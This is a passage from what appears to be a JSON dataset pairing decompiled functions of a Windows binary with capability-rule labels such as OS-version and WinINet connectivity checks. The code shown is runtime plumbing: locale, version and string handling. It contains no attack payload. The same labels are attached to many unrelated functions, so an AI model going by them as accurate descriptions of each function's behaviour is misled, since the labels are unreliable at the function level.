if (iVar5 == 0) {\n                            fcn.0040a878(arg_8h);\n                            var_4h = var_4h + 2;\n                        }\n                        else {\n                            iVar5 = fcn.004096e4();\n                            if (iVar5 == 0) {\n                                if (var_16h < 0xc) {\n                                    fcn.0040a8bc(arg_8h);\n                                }\n                                else {\n                                    fcn.0040a8bc(arg_8h);\n                                }\n                                var_4h = var_4h + 3;\n                            }\n                            else {\n                                iVar5 = fcn.004096e4();\n                                if (iVar5 == 0) {\n                                    fcn.0040a950(&stack0xfffffffc);\n                                    uVar7 = *(arg_8h + 8);\n                                    fcn.0040a83c(uVar7, *(arg_8h + 0xc));\n                                    fcn.0040a8bc(uVar7);\n                                    var_4h = var_4h + 3;\n                                }\n                                else {\n                                    iVar5 = fcn.004096e4();\n                                    if (iVar5 == 0) {\n                                        fcn.0040a950(&stack0xfffffffc);\n                                        uVar7 = *(arg_8h + 8);\n                                        fcn.0040a83c(uVar7, *(arg_8h + 0xc));\n                                        fcn.0040a8bc(uVar7);\n                                        var_4h = var_4h + 2;\n                                    }\n                                    else {\n                                        fcn.0040a878(arg_8h);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    break;\n                case 0x43:\n                    fcn.0040a924(&stack0xfffffffc);\n                    fcn.0040ac5c(arg_8h);\n                    fcn.0040a988(&stack0xfffffffc);\n                    if (((var_16h != 0) || (var_18h != 0)) || (var_1ah != 0)) {\n                        fcn.0040a878(arg_8h);\n                        fcn.0040ac5c(arg_8h);\n                    }\n                    break;\n                case 0x44:\n                    fcn.0040a924(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040a950(&stack0xfffffffc);\n                        fcn.0040a8d8(arg_8h);\n                    }\n                    else if (var_ch == 3) {\n                        uVar7 = *(arg_8h + 8);\n                        fcn.0040a83c(uVar7, *(arg_8h + 0xc));\n                        fcn.0040a8bc(uVar7);\n                    }\n                    else if (var_ch == 4) {\n                        uVar7 = *(arg_8h + 8);\n                        fcn.0040a83c(uVar7, *(arg_8h + 0xc));\n                        fcn.0040a8bc(uVar7);\n                    }\n                    else if (var_ch == 5) {\n                        fcn.0040ac5c(arg_8h);\n                    }\n                    else {\n                        fcn.0040ac5c(arg_8h);\n                    }\n                    break;\n                case 0x45:\n                    fcn.0040a924(&stack0xfffffffc);\n                    fcn.0040a950(&stack0xfffffffc);\n                    iVar5 = arg_8h;\n                    fcn.0040ab44(&stack0xfffffffc);\n                    fcn.0040a8bc(iVar5);\n                    break;\n                case 0x47:\n                    fcn.0040a924(&stack0xfffffffc);\n                    fcn.0040a950(&stack0xfffffffc);\n                    iVar5 = arg_8h;\n                    fcn.0040a9c8(&stack0xfffffffc);\n                    fcn.0040a8bc(iVar5);\n                    break;\n                case 0x48:\n                    fcn.0040a924(&stack0xfffffffc);\n                    fcn.0040a988(&stack0xfffffffc);\n                    bVar2 = false;\n                    puVar4 = var_4h;\n                    while (*puVar4 != 0) {\n                        if ((*((*puVar4 >> 3) + 0x49081c) >> (*puVar4 & 7) & 1) == 0) {\n                            uVar1 = *puVar4;\n                            if (uVar1 < 0x49) {\n                                if (uVar1 == 0x48) break;\n                                if ((uVar1 == 0x22) || (uVar1 == 0x27)) {\n                                    bVar2 = bVar2 ^ 1;\n                                }\n                                else if (uVar1 == 0x41) goto code_r0x0040afd2;\n                            }\n                            else if (uVar1 == 0x61) {\ncode_r0x0040afd2:\n                                if (!bVar2) {\n                                    iVar5 = fcn.004096e4();\n                                    if ((iVar5 != 0) && (iVar5 = fcn.004096e4(),  iVar5 != 0)) {\n                                        fcn.004096e4();\n                                    }\n                                    break;\n                                }\n                            }\n                            else if (uVar1 == 0x68) break;\n                            puVar4 = puVar4 + 1;\n                        }\n                        else {\n                            puVar4 = fcn.0040d1c0();\n                        }\n                    }\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040a8d8(arg_8h);\n                    break;\n                case 0x4d:\n                    fcn.0040a924(&stack0xfffffffc);\n                    fcn.0040a950(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040a8d8(arg_8h);\n                    }\n                    else if (var_ch - 1U == 2) {\n                        fcn.0040a8bc(arg_8h);\n                    }\n                    else {\n                        fcn.0040a8bc(arg_8h);\n                    }\n                    break;\n                case 0x4e:\n                    fcn.0040a924(&stack0xfffffffc);\n                    fcn.0040a988(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040a8d8(arg_8h);\n                    break;\n                case 0x53:\n                    fcn.0040a924(&stack0xfffffffc);\n                    fcn.0040a988(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040a8d8(arg_8h);\n                    break;\n                case 0x54:\n                    fcn.0040a924(&stack0xfffffffc);\n                    if (var_ch == 1) {\n                        fcn.0040ac5c(arg_8h);\n                    }\n                    else {\n                        fcn.0040ac5c(arg_8h);\n                    }\n                    break;\n                case 0x59:\n                    fcn.0040a924(&stack0xfffffffc);\n                    fcn.0040a950(&stack0xfffffffc);\n                    if (var_ch < 3) {\n                        fcn.0040a8d8(arg_8h);\n                    }\n                    else {\n                        fcn.0040a8d8(arg_8h);\n                    }\n                    break;\n                case 0x5a:\n                    fcn.0040a924(&stack0xfffffffc);\n                    fcn.0040a988(&stack0xfffffffc);\n                    if (3 < var_ch) {\n                        var_ch = 3;\n                    }\n                    fcn.0040a8d8(arg_8h);\n                }\n            }\n            else {\n                iVar5 = arg_8h;\n                fcn.0040d1a0();\n                fcn.0040a878(iVar5);\n                var_4h = fcn.0040d1c0();\n                var_1eh._0_1_ = 0x20;\n            }\n        }\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + -1;\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x40b3e7;\n    uStack68 = 0x40b3df;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 2793
    },
    "0040b6d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.0040b6d0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint uStack20;\n    \n    uStack20 = 0;\n    iVar5 = 7;\n    piVar3 = 0x4958d4;\n    puVar4 = 0x4958f0;\n    do {\n        if (*piVar3 == 0) break;\n        uVar1 = fcn.00405264();\n        fcn.00405264(uVar1);\n        iVar2 = fcn.0040d3a8();\n        if (iVar2 != 0) {\n            uStack20 = *puVar4;\n            break;\n        }\n        puVar4 = puVar4 + 1;\n        piVar3 = piVar3 + 1;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    return CONCAT44(uStack20, uStack20);\n}\n",
        "token_count": 232
    },
    "0040b724": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b724(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (*0x4958c8 == 0x12) {\n        if (in_EAX < 100) {\n            uVar1 = fcn.0040a864();\n            uVar2 = *(arg_8h + -4) >> 0x1f;\n            in_EAX = in_EAX + (((uVar1 & 0xffff) + ((*(arg_8h + -4) ^ uVar2) - uVar2)) / 100) * 100;\n        }\n        if (0 < *(arg_8h + -4)) {\n            *(arg_8h + -4) = -*(arg_8h + -4);\n        }\n    }\n    else {\n        *(arg_8h + -4) = *(arg_8h + -4) + -1;\n    }\n    return *(arg_8h + -4) + in_EAX;\n}\n",
        "token_count": 243
    },
    "0040b780": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040b780(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    ushort var_18h;\n    uint var_16h;\n    ushort var_12h;\n    ushort var_10h;\n    char var_eh;\n    uchar var_dh;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_20h = 0;\n    var_8h = 0;\n    uStack64 = 0x40baa2;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_16h._0_2_ = 0;\n    var_18h = 0;\n    var_1ch._0_1_ = 0;\n    var_dh = 0;\n    var_eh = fcn.0040b63c();\n    var_4h = 0;\n    if (**0x495810 == 'g') {\n        fcn.0040b688();\n        fcn.004052c4(&fcn.0040b780::var_20h);\n        fcn.00408c1c();\n        var_4h = fcn.0040b6d0();\n    }\n    else {\n        iVar2 = fcn.0040d2dc();\n        if (0 < iVar2) {\n            var_4h = *0x4958f0;\n        }\n    }\n    cVar1 = fcn.0040b494(&fcn.0040b780::var_1ch + 3);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.0040b600(),  cVar1 != '\\0')) {\n        in_stack_ffffffac = 0x40b86e;\n        cVar1 = fcn.0040b494(&fcn.0040b780::var_1ch + 2);\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0040b600();\n            if (cVar1 == '\\0') {\n                fcn.0040a864();\n                if (var_eh == '\\x01') {\n                    var_18h = var_10h;\n                    var_16h._0_2_ = var_12h;\n                }\n                else {\n                    var_16h._0_2_ = var_10h;\n                    var_18h = var_12h;\n                }\n            }\n            else {\n                in_stack_ffffffac = &fcn.0040b780::var_1ch + 1;\n                cVar1 = fcn.0040b494(in_stack_ffffffac);\n                if (cVar1 == '\\0') goto code_r0x0040ba7f;\n                if (var_eh == '\\0') {\n                    var_1ch._0_1_ = var_1ch._1_1_;\n                    var_16h._0_2_ = var_10h;\n                    var_18h = var_12h;\n                }\n                else if (var_eh == '\\x01') {\n                    var_1ch._0_1_ = var_1ch._1_1_;\n                    var_16h._0_2_ = var_12h;\n                    var_18h = var_10h;\n                }\n                else if (var_eh == '\\x02') {\n                    var_1ch._0_1_ = var_1ch._3_1_;\n                    var_16h._0_2_ = var_12h;\n                    var_18h = var_16h._2_2_;\n                }\n                if (var_4h < 1) {\n                    if (var_1ch < 3) {\n                        fcn.0040a864();\n                    }\n                }\n                else {\n                    fcn.0040b724(&stack0xfffffffc);\n                }\n            }\n            fcn.0040b600();\n            fcn.0040b470();\n            if ((*0x4958d0 != '\\0') && (iVar2 = fcn.004053a8(),  iVar2 != 0)) {\n                if (**0x495824 - 0x30U < 10) {\n                    fcn.0040b688();\n                }\n                else {\n                    do {\n                        while ((iVar2 = fcn.00405060(),  *param_2 <= iVar2 && (*(in_EAX + -1 + *param_2) != ' '))) {\n                            *param_2 = *param_2 + 1;\n                        }\n                        fcn.0040b470();\n                        iVar2 = fcn.00405060();\n                        if (iVar2 < *param_2) break;\n                        fcn.00405060();\n                        fcn.004052c4();\n                        iVar2 = fcn.00408bb8();\n                        if (iVar2 == 0) break;\n                        fcn.00405060();\n                        fcn.004052c4();\n                        iVar2 = fcn.00408bb8();\n                    } while (iVar2 != 0);\n                }\n            }\n            var_dh = fcn.0040a604(var_ch);\n            in_stack_ffffffac = var_ch;\n        }\n    }\ncode_r0x0040ba7f:\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00404dc4(0x40baa9);\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 1306
    },
    "0040bacc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040bacc(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *in_stack_ffffffd0;\n    uint16_t in_stack_ffffffd4;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint32_t uStack32;\n    ushort uStack28;\n    ushort uStack26;\n    uchar auStack24 [4];\n    uchar auStack20 [4];\n    \n    uVar2 = 0;\n    iVar3 = -1;\n    cVar1 = fcn.0040b528();\n    if ((cVar1 == '\\0') && (cVar1 = fcn.0040b528(),  cVar1 == '\\0')) {\n        cVar1 = fcn.0040b528();\n        if ((cVar1 != '\\0') || (cVar1 = fcn.0040b528(),  cVar1 != '\\0')) {\n            iVar3 = 0xc;\n        }\n    }\n    else {\n        iVar3 = 0;\n    }\n    if (-1 < iVar3) {\n        fcn.0040b470();\n    }\n    cVar1 = fcn.0040b494(&stack0xffffffec);\n    if (cVar1 != '\\0') {\n        uStack32 = uStack32 & 0xffff;\n        uStack28 = 0;\n        uStack26 = 0;\n        arg_8h_00 = 0x40bb7e;\n        cVar1 = fcn.0040b600();\n        if (cVar1 != '\\0') {\n            arg_8h_00 = &stack0xffffffe8;\n            cVar1 = fcn.0040b494(arg_8h_00);\n            if (cVar1 == '\\0') {\n                return 0;\n            }\n            in_stack_ffffffd4 = 0xbbac;\n            cVar1 = fcn.0040b600();\n            if (cVar1 != '\\0') {\n                arg_8h = &stack0xffffffe4;\n                cVar1 = fcn.0040b494(arg_8h);\n                in_stack_ffffffd4 = arg_8h;\n                if (cVar1 == '\\0') {\n                    return 0;\n                }\n                in_stack_ffffffd0 = 0x40bbda;\n                cVar1 = fcn.0040b600();\n                if (cVar1 != '\\0') {\n                    in_stack_ffffffd0 = &stack0xffffffe0;\n                    cVar1 = fcn.0040b494(in_stack_ffffffd0);\n                    if (cVar1 == '\\0') {\n                        return 0;\n                    }\n                }\n            }\n        }\n        if (iVar3 < 0) {\n            cVar1 = fcn.0040b528();\n            if ((cVar1 == '\\0') && (cVar1 = fcn.0040b528(),  cVar1 == '\\0')) {\n                cVar1 = fcn.0040b528();\n                if ((cVar1 != '\\0') || (cVar1 = fcn.0040b528(),  cVar1 != '\\0')) {\n                    iVar3 = 0xc;\n                }\n            }\n            else {\n                iVar3 = 0;\n            }\n        }\n        if ((iVar3 < 0) || ((in_stack_ffffffd4 != 0 && (in_stack_ffffffd4 < 0xd)))) {\n            fcn.0040b470();\n            uVar2 = fcn.0040a4fc(in_stack_ffffffd0, arg_8h_00 >> 0x10);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 817
    },
    "0040be5c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040be5c(int32_t *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.0040bde4(arg_8h);\n    if (*arg_8h == 0) {\n        fcn.00406a50();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0040bfbc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040bfbc(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 1;\n    while( true ) {\n        if (*(iVar1 * 4 + 0x4958d0) == 0) {\n            fcn.00404f98();\n            return 1;\n        }\n        if (iVar1 == 7) break;\n        iVar1 = iVar1 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 106
    },
    "0040c9bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c9bc(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *puVar4;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint lpFilename;\n    uint lpBuffer;\n    uint hModule;\n    int32_t var_10h;\n    uint var_4h;\n    \n    puStack384 = &stack0xfffffffc;\n    var_14ch = 0;\n    var_154h = 0;\n    var_150h = 0;\n    var_4h = 0;\n    uStack388 = 0x40cb77;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack392;\n    iVar1 = *(arg_8h + -4);\n    if (*(iVar1 + 0x14) == 0) {\n        puStack384 = &stack0xfffffffc;\n        fcn.00406a50();\n    }\n    else {\n        fcn.00406a50();\n    }\n    uVar2 = *(iVar1 + 0x18);\n    sub.kernel32.dll_VirtualQuery_1(*(iVar1 + 0xc), &lpBuffer, 0x1c);\n    if (var_10h == 0x1000) {\n        iVar3 = sub.kernel32.dll_GetModuleFileNameA_1(hModule, &lpFilename, 0x105);\n        if (iVar3 != 0) {\n            var_148h = *(iVar1 + 0xc);\n            var_144h._0_1_ = 5;\n            fcn.00405010();\n            fcn.0040941c();\n            var_140h = var_14ch;\n            var_13ch._0_1_ = 0xb;\n            var_138h = var_4h;\n            var_134h._0_1_ = 0xb;\n            var_12ch._0_1_ = 5;\n            puVar4 = &var_148h;\n            arg_8h_00 = 3;\n            var_130h = uVar2;\n            fcn.00406a50();\n            fcn.0040c5e8(arg_8h_00, puVar4);\n            goto code_r0x0040cb46;\n        }\n    }\n    var_16ch = *(iVar1 + 0xc);\n    var_168h._0_1_ = 5;\n    var_164h = var_4h;\n    var_160h._0_1_ = 0xb;\n    var_158h._0_1_ = 5;\n    puVar4 = &var_16ch;\n    arg_8h_00 = 2;\n    var_15ch = uVar2;\n    fcn.00406a50();\n    fcn.0040c5e8(arg_8h_00, puVar4);\ncode_r0x0040cb46:\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.00404da0(0x40cb7e);\n    fcn.00404dc4();\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 867
    },
    "0040cce4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040cce4(void)\n\n{\n    if (*0x495918 != NULL) {\n        *(*0x495918 + 3) = 1;\n        (**(**0x495918 + -8))();\n        *0x495918 = NULL;\n    }\n    if (*0x49591c != 0) {\n        *(*0x49591c + 0xc) = 1;\n        fcn.00403f58();\n        *0x49591c = 0;\n    }\n    **0x4928c4 = 0;\n    **0x4929e0 = 0;\n    **0x49293c = 0;\n    **0x4929bc = 0;\n    **0x4929e8 = 0;\n    **0x492b50 = 0;\n    return;\n}\n",
        "token_count": 184
    },
    "0040cd64": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040cd64(void)\n\n{\n    int32_t iVar1;\n    uint uStack148;\n    uint uStack144;\n    uint32_t uStack140;\n    int32_t iStack136;\n    \n    uStack148 = 0x94;\n    iVar1 = sub.kernel32.dll_GetVersionExA(&uStack148);\n    if (iVar1 != 0) {\n        *0x4907d4 = iStack136;\n        *0x4907d8 = uStack148;\n        *0x4907dc = uStack144;\n        if (iStack136 == 1) {\n            *0x4907e0 = uStack140 & 0xffff;\n        }\n        else {\n            *0x4907e0 = uStack140;\n        }\n        fcn.00405010();\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "0040cee0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040cee0(uint param_1, int32_t param_2)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = 0;\n    if ((in_EAX != NULL) && (in_EAX[param_2] != 0)) {\n        if (param_2 == 0) {\n            if ((*((*in_EAX >> 3) + 0x49081c) >> (*in_EAX & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n        else {\n            iVar3 = param_2 + -1;\n            while ((-1 < iVar3 && ((*((in_EAX[iVar3] >> 3) + 0x49081c) >> (in_EAX[iVar3] & 7) & 1) != 0))) {\n                iVar3 = iVar3 + -1;\n            }\n            uVar1 = param_2 - iVar3 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == 0) {\n                uVar2 = 2;\n            }\n            else if ((*((in_EAX[param_2] >> 3) + 0x49081c) >> (in_EAX[param_2] & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 364
    },
    "0040cf54": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040cf54(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x4958d0 != '\\0') {\n        fcn.00405264();\n        uVar1 = fcn.0040cee0();\n    }\n    return uVar1;\n}\n",
        "token_count": 71
    },
    "0040cf78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040cf78(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x4958d0 != '\\0') {\n        uVar1 = fcn.0040cee0();\n    }\n    return uVar1;\n}\n",
        "token_count": 63
    },
    "0040d1a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0040d1a0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*0x4958d0 != '\\0') {\n        iVar1 = sub.user32.dll_CharNextA_1();\n        return iVar1 - in_EAX;\n    }\n    return 1;\n}\n",
        "token_count": 77
    },
    "0040d1c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d1c8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 1;\n    if ((*0x4958d0 != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x49081c) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.00405264();\n        uVar1 = fcn.0040d1a0();\n    }\n    return uVar1;\n}\n",
        "token_count": 157
    },
    "0040d200": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d200(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = param_2 + 1;\n    if ((*0x4958d0 != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x49081c) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.00405264();\n        iVar1 = fcn.0040d1a0();\n        iVar1 = iVar1 + param_2;\n    }\n    return iVar1;\n}\n",
        "token_count": 170
    },
    "0040d3a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040d3a8(uint param_1, char *param_2)\n\n{\n    uint8_t uVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack24;\n    uint32_t uStack20;\n    \n    iVar4 = 0;\n    if ((((in_EAX != NULL) && (*in_EAX != '\\0')) && (param_2 != NULL)) && (*param_2 != '\\0')) {\n        iStack24 = fcn.00409568();\n        uVar2 = fcn.00409568();\n        iVar4 = fcn.0040973c();\n        while ((iVar4 != 0 && (uVar2 <= iStack24 - (iVar4 - in_EAX)))) {\n            uVar1 = fcn.0040cf78();\n            uStack20 = uStack20 & 0xffffff00 | uVar1;\n            if (uVar1 != 2) {\n                iStack24 = 0x400;\n                iVar3 = sub.kernel32.dll_CompareStringA_1();\n                if (iVar3 == 2) goto code_r0x0040d43e;\n            }\n            iVar4 = fcn.0040973c();\n        }\n        iVar4 = 0;\n    }\ncode_r0x0040d43e:\n    return CONCAT44(uStack20, iVar4);\n}\n",
        "token_count": 319
    },
    "0040d518": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040d518(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    *0x4958c4 = 0x409;\n    *0x4958c8 = 9;\n    *0x4958cc = 1;\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1();\n    if (uVar1 != 0) {\n        *0x4958c4 = uVar1;\n    }\n    if (uVar1 != 0) {\n        *0x4958c8 = uVar1 & 0x3ff;\n        *0x4958cc = (uVar1 & 0xffff) >> 10;\n    }\n    puVar3 = 0x40d5bc;\n    puVar4 = 0x49081c;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    if ((*0x4907d8 < 5) || (*0x4907d4 != 2)) {\n        iVar2 = sub.user32.dll_GetSystemMetrics(0x4a);\n        *0x4958d1 = iVar2 != 0;\n    }\n    else {\n        *0x4958d1 = true;\n    }\n    iVar2 = sub.user32.dll_GetSystemMetrics(0x2a);\n    *0x4958d0 = iVar2 != 0;\n    if (*0x4958d0) {\n        fcn.0040d4bc(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 400
    },
    "0040d5dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0040d5dc(void)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint *var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    